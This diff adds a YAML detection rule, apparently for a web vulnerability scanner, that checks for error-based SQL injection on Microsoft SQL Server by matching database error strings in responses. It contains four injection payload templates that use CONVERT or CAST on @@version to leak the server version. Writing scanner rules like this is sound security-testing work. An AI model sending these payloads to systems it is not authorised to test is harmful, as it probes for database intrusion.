@@ -1,0 +1,59 @@
+id: "sqli-error-mssql"
+issue_code: "sql_injection"
+detection_condition: "or"
+detection_methods:
+  - response_condition:
+      contains: "Microsoft SQL Server"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "Unclosed quotation mark"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "mssql_query"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "SqlClient"
+      part: body
+      confidence: 85
+  - response_condition:
+      contains: "ODBC SQL Server Driver"
+      part: body
+      confidence: 90
+  - response_condition:
+      contains: "Microsoft SQL Server 20"
+      part: body
+      confidence: 95
+  - response_condition:
+      contains: "SQL Server 20"
+      part: body
+      confidence: 90
+  # Generic database error fallback
+  - response_check:
+      check: "database_error"
+      confidence: 75
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: mssql
+    - type: platform
+      value: aspnet
+    - type: platform
+      value: iis
+    - type: scan_mode
+      value: fuzz
+templates:
+  - "' AND 1=CONVERT(int,@@version)--"
+  - "1' AND 1=CONVERT(int,@@version)--"
+  - "' AND 1=CAST(@@version AS int)--"
+  - "') AND 1=CONVERT(int,@@version)--"
+categories:
+  - sql_injection
+  - error_based
+  - mssql
+platforms:
+  - mssql
+  - aspnet
